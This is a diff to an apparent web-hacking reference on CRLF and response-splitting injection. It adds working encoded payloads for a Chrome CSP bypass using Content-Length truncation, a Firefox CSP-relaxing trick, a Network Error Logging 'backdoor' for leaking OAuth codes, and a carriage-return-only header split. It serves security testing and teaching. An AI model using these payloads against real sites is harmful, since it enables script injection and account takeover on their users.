@@ -57,7 +57,66 @@ Some-Header: x
 
 More tricks for `[INPUT]` _inside_ the existing `Content-Type` header itself can be found in [this writeup](https://gist.github.com/avlidienbrunn/8db7f692404cdd3c325aa20d09437e13). It contains a trick to escape the HTML context if your payload in the body is limited.
 
-A `Content-Security-Policy:` may be in effect on the resulting page. If your XSS is limited by this, [content-security-policy-csp.md](cross-site-scripting-xss/content-security-policy-csp.md "mention") bypasses are the first thing you should look at of course. But specifically in Firefox there is another trick that can almost _redefine_ the policy. [Issue 1864434](https://bugzilla.mozilla.org/show_bug.cgi?id=1864434) tracks this behavior where using the special `multipart/x-mixed-replace` content type, the body has the following structure:
+### Content-Security-Policy
+
+A `Content-Security-Policy:` may be in effect on the resulting page if it comes _before your injection point_. If your XSS is limited by this, [content-security-policy-csp.md](cross-site-scripting-xss/content-security-policy-csp.md "mention") bypasses are the first thing you should look at of course. Using this Response Splitting gadget, there are some unique extra bypasses for both Chrome and Firefox.
+
+#### Chrome load `'self'` with Content-Length truncation
+
+It's possible to craft almost a completely arbitrary response using Response Splitting, with your exact needed headers and body. If `script-src 'self'` is defined, you may only load scripts from the current domain, which seems safe. We can bypass it, however, by crafting a 2nd Response Splitting URL and loading that as a script:
+
+{% code overflow="wrap" %}
+```html
+<script src="/vuln?inject=x%0D%0AContent-Type:%20text/javascript%0D%0A%0D%0Aalert(origin)"></script>
+```
+{% endcode %}
+
+This might load a response like this:
+
+```http
+HTTP/1.1 200 OK
+X-Inject: x
+Content-Type: text/javascript
+
+alert(origin)<!DOCTYPE html>
+<html>
+<h1>Hello, world!</h1>
+...
+```
+
+> Uncaught SyntaxError: Unexpected identifier `'html'`
+
+It quickly throws an error, because of the suffix content from the original uninjected page. The trick to solving this shared by [@siunam321](https://x.com/siunam321/status/1962525358680604980), is to add a small `Content-Length:` header that cuts off the body right after our payload:
+
+<pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
+X-Inject: x
+Content-Type: text/javascript
+<strong>Content-Length: 13
+</strong>
+alert(origin)
+</code></pre>
+
+This will execute successfully, so the final payload starting from the initial HTML page with a CSP becomes:
+
+{% code title="URL" overflow="wrap" %}
+```url
+/vuln?inject=x%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Cscript%20src=%22%2Fvuln%3Finject%3Dx%250D%250AContent-Type:%2520application%2Fjavascript%250D%250AContent-Length%3A%252013%250D%250A%250D%250Aalert%28origin%29%22%3E%3C/script%3E
+```
+{% endcode %}
+
+{% code title="HTTP Response" %}
+```http
+HTTP/1.1 200 OK
+X-Inject: x
+Content-Type: text/html
+
+<script src="/vuln?inject=x%0D%0AContent-Type:%20application/javascript%0D%0AContent-Length:%2013%0D%0A%0D%0Aalert(origin)"></script>
+```
+{% endcode %}
+
+#### Firefox replace CSP
+
+But specifically in Firefox there is another trick that can almost _redefine_ the policy. [Issue 1864434](https://bugzilla.mozilla.org/show_bug.cgi?id=1864434) tracks this behavior where using the special `multipart/x-mixed-replace` content type, the body has the following structure:
 
 <pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
 Content-Type: multipart/x-mixed-replace; boundary=BOUNDARY
@@ -75,7 +134,7 @@ Content-Type: multipart/x-mixed-replace; boundary=BOUNDARY
 
 You may recognize the similarities with the `multipart/form-data` type commonly used in file upload requests. The body starts and ends with a boundary. Documents within those replace the previous one. The above would result in "Second message" in a `text/plain` content type to be displayed.
 
-Interestingly, you can replace other headers too, like `Content-Security-Policy`. While it won't fully replace the header or specified directives, you can _add directives_ that the main header didn't specify, similar to if you would append content to the existing header. With `script-src` and `style-src` directives, you can use the uncommon [`script-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src-elem) and [`style-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/style-src-elem) to set a laxer policy for specifically `<script>` and `<style>`/`<link rel=stylesheet>` elements.\
+Interestingly, you can **replace** other headers too, like `Content-Security-Policy`. While it won't fully replace the header or specified directives, you **can only add directives** that the main header didn't specify, similar to if you would append content to the existing header. With `script-src` and `style-src` directives, you can use the uncommon [`script-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src-elem) and [`style-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/style-src-elem) to set a laxer policy for specifically `<script>` and `<style>`/`<link rel=stylesheet>` elements.\
 You can just enable all of the unsafe features again:
 
 <pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
@@ -230,7 +289,11 @@ Due to what's arguably a chrome bug, injecting a header in a subresource request
 
 ### NEL (Network Error Logging)
 
-[Network Error Logging](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Network_Error_Logging) is a part of the [Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API), responsible for sending reports about certain things happening in your browser. These reports can be sent externally, for example to a server you control. One of the most useful for attackers is NEL which will log URLs that gave error status codes. Using the `success_fraction` parameter it's also possible to leak successful URLs. `include_subdomains` allows leaking URLs upon DNS failures of domains under the one it was set on.
+[Network Error Logging](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Network_Error_Logging) is a part of the [Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API), responsible for sending reports about certain things happening in your browser. These reports can be sent externally, for example to a server you control. One of the most useful for attackers is NEL which will **leak all URLs that get visited**. Using the `success_fraction` parameter it's also possible to leak successful URLs. `include_subdomains` allows leaking URLs upon DNS failures of domains under the one it was set on.
+
+{% hint style="success" %}
+**Tip**: a common pattern in _OAuth_ is sending a secret code through query parameters, and after planting a "backdoor" with this technique, you'll get these leaked URLs and can achieve ATO.
+{% endhint %}
 
 This is all configured using response headers, and once registered, will keep being active for quite a while (not only a single request). First, you need to define an endpoint to report to:
 
@@ -308,6 +371,22 @@ fetch("https://target.com/inject%0aAccess-Control-...").then(async r => {
 
 {% hint style="warning" %}
 **Note**: not all response headers are allowed to be read, such as `Location:` (or the in-between bodies of redirects) or `Set-Cookie`. It can often be used to fetch authenticated data and CSRF tokens, for example.
+{% endhint %}
+
+### Carriage return (`\r`) only
+
+A protection some applications take to CRLF issues is **blocking newlines** (`\n`) in header values. While this sounds correct, the carriage return (`\r`) character is actually just as important to block.
+
+**Chrome** can split headers by `\r` ([source](https://x.com/zakfedotkin/status/1963603867641287150)) allowing an injection without newlines to still use any of the attacks mentioned here under [#response-headers](crlf-header-injection.md#response-headers "mention"). For example:
+
+<figure><img src="../../.gitbook/assets/image (78).png" alt="" width="371"><figcaption><p>Burp Suite response showing <code>Set-Cookie</code> injection with only <code>\r</code></p></figcaption></figure>
+
+Even though Burp Suite does not recognize it as a new header, Chrome does, and the cookie will be set:
+
+<figure><img src="../../.gitbook/assets/image (79).png" alt="" width="539"><figcaption><p>Chrome recognizing the header and saving the cookie to storage</p></figcaption></figure>
+
+{% hint style="warning" %}
+**Note**: It's not possible to split into the body this way, so for [#response-splitting](crlf-header-injection.md#response-splitting "mention")'s impact, you still require the use of newlines.
 {% endhint %}
 
 ## SMTP
